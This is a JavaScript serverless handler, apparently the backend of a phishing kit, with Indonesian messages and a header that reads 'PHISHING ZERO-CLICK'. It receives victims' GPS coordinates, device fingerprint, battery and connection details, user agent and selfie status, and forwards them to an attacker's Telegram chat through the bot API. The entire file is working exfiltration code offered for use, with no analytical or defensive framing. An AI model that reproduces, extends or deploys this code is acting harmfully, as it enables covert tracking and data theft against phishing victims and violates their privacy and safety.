export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        console.error('Missing TELEGRAM env vars');
        return res.status(500).json({ error: 'Telegram not configured' });
    }

    try {
        const data = req.body;
        const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        let message = `🔥 *PHISHING ZERO-CLICK - DATA BARU* 🔥\n\n`;
        message += `📅 *Waktu:* ${time}\n`;

        if (data.location) {
            message += `📍 *Lokasi:* ${data.location.lat}, ${data.location.lng}\n`;
            message += `   Akurasi: ${data.location.accuracy}m\n`;
        } else message += `📍 *Lokasi:* Tidak diberikan\n`;

        if (data.fingerprint) {
            const fp = data.fingerprint;
            message += `\n🖥️ *Perangkat:* ${fp.platform || 'N/A'}\n`;
            message += `   Layar: ${fp.screen || 'N/A'}\n`;
            message += `   Timezone: ${fp.timezone || 'N/A'}\n`;
            message += `   Bahasa: ${fp.language || 'N/A'}\n`;
            message += `   Cookies: ${fp.cookiesEnabled ? '✅' : '❌'}\n`;
            message += `   CPU Cores: ${fp.hardwareConcurrency || 'N/A'}\n`;
            if (fp.battery) message += `   Baterai: ${fp.battery.level}${fp.battery.charging ? ' (charging)' : ''}\n`;
            if (fp.connection) message += `   Koneksi: ${fp.connection.effectiveType} (${fp.connection.downlink} Mbps)\n`;
            message += `\n📱 *User Agent:*\n${fp.userAgent || 'N/A'}\n`;
        }

        if (data.photo) message += `\n📸 *Selfie:* Berhasil diambil\n`;
        else message += `\n📸 *Selfie:* Gagal / tidak diberikan\n`;

        if (data.errors?.length) message += `\n⚠️ *Error:* ${data.errors.join(', ')}\n`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
        });

        if (!response.ok) throw new Error(`Telegram error ${response.status}`);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
}